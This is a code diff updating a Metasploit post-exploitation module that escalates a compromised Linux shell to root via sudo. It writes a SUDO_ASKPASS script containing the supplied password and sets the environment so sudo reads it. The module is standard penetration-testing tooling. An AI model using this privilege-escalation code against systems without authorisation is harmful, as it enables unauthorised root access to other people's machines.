@@ -1,16 +1,13 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
+  include Msf::Exploit::FileDropper
 
 
   def initialize(info={})
@@ -39,11 +36,15 @@ class Metasploit3 < Msf::Post
       register_options(
         [
           OptString.new('PASSWORD', [false, 'The password to use when running sudo.'])
-        ], self.class)
+        ])
   end
 
   # Run Method for when run command is issued
   def run
+    if session.type == 'meterpreter'
+      fail_with(Failure::BadConfig, "Meterpreter sessions cannot be elevated with sudo")
+    end
+
     print_status("SUDO: Attempting to upgrade to UID 0 via sudo")
     sudo_bin = cmd_exec("which sudo")
     if is_root?
@@ -101,12 +102,14 @@ class Metasploit3 < Msf::Post
         # Generally will be much snappier over ssh.
         # Need to timeout in case there's a blocking prompt after all
         ::Timeout.timeout(120) do
+          # Create the shell script that will pass the password to sudo
           vprint_status "Writing the SUDO_ASKPASS script: #{askpass_sh}"
-          cmd_exec("echo \\#\\!/bin/sh > #{askpass_sh}") # Cursed csh
-          cmd_exec("echo echo #{password} >> #{askpass_sh}")
+          write_file(askpass_sh, "#!/bin/sh\necho '#{password}'\n")
+          register_file_for_cleanup(askpass_sh)
           vprint_status "Setting executable bit."
           cmd_exec("chmod +x #{askpass_sh}")
           vprint_status "Setting environment variable."
+
           # Bruteforce the set command. At least one should work.
           cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}")
           cmd_exec("export SUDO_ASKPASS=#{askpass_sh}")
@@ -118,19 +121,6 @@ class Metasploit3 < Msf::Post
       rescue
         print_error "SUDO: Sudo with a password failed. Check the session log."
       end
-      # askpass_cleanup(askpass_sh)
     end
   end
-
-  def askpass_cleanup(askpass_sh)
-    begin
-      ::Timeout.timeout(20) do
-        vprint_status "Deleting the SUDO_ASKPASS script."
-        cmd_exec("rm #{askpass_sh}")
-      end
-    rescue ::Timeout::Error
-      print_error "Timed out during sudo cleanup."
-    end
-  end
-
 end
